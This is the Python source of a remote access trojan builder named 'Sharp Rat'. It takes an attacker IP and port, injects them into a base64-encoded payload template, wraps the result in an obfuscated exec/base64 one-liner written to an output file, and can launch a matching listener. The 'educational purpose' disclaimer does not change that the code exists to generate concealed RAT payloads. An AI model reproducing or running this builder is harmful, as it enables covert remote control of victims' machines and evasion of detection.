import argparse , pyfiglet as pf , time
import os
parse  = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <File name>]")
parse.add_argument("-i","--ip",metavar="<ip>",help="IP address")
parse.add_argument("-p","--port" ,metavar="<port>",help="port")
parse.add_argument("-o","--output" ,metavar="<File name>",help="Output file name")
parse.add_argument("--build",help="For creating a payload",action='store_true')
parse.add_argument("--shell",help="For making listener" , action='store_true')
args = parse.parse_args()

def encode(data):
    encoded = (__import__('base64').b64encode(__import__('codecs').getencoder("utf-8")(data)[0]))
    ok1=(f"'{encoded.decode()}'")
    ok = f"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')({ok1})[0]))"
    return ok

def decode(data):
    if data[0] == "b":
        data = data[1:]
    decoded = (__import__('base64').b64decode(__import__('codecs').getencoder("utf-8")(data)[0]).decode())
    # print(type(decoded)) = > str
    return decoded

def file_check():
    if not (os.path.isdir("OUTPUT")):
        os.mkdir("OUTPUT")
    if not (os.path.isdir("data")):
        print("[-] Require FOLDER is not found ")
        os._exit(1)
    elif not (os.path.isfile("data/payload.py")):
        print("[-] Require Payload is not found ")
        os._exit(1)
    elif not (os.path.isfile("data/Listener.py")):
        print("[-] Require Listener is not found ")
        os._exit(1)

def gen_pay(ip , port , out):
    try:
        with open("data/payload.py" , "r") as f1:
            Sample = f1.read()
            decode_payload = decode(Sample)
        # # Generate a payload
        words = ["<IP>", "<PORT>"]
        for i in words: 
            if i == "<IP>":
                w = ip
            elif i == "<PORT>":
                w = port
            main1 = decode_payload.replace(i, w)
            decode_payload = main1
        # print(decode_payload) # to varify ..
        Encoded_payload = encode(decode_payload)
        with open(f"OUTPUT/{out}", "w") as f:
            f.write("# THis Code Is Written By __HAQIOLOGIST__TEAM__\n# This Tool Is Only For Educational Purpose \n# So,this tool is encoded\n")
            f.write(Encoded_payload)

        lc = os.getcwd()+"\\OUTPUT\\"+out             
        print("[+] Saved as: "+ out)
        print(f"[+] Payload size: {os.path.getsize(lc)} bytes.")
        print("[+] Location: "+ lc)

    except Exception as e:
        print(f"[ ERROR ] {e}")

def main(args):
    if args.ip and args.port:
        if args.build:
            print( pf.figlet_format("Sharp Rat",font="slant"))
            port = (args.port)
            ip = args.ip
            out = args.output
            ## DETAIL '''
            """
            print(f"[+] Your selected port is : {args.port}")
            print(f"[+] Your selected port is : {args.ip}")
            """
            
            gen_pay(ip , port , out)
        elif(args.shell):
            os.system(f"cd data & python Listener.py {args.ip} {int(args.port)} ")

file_check()
main(args)

#  For Encode data 

# print(
#     __import__('base64').b64encode(
#         __import__('codecs').getencoder("utf-8")(
#             main
#         )[0]
#     )
# )

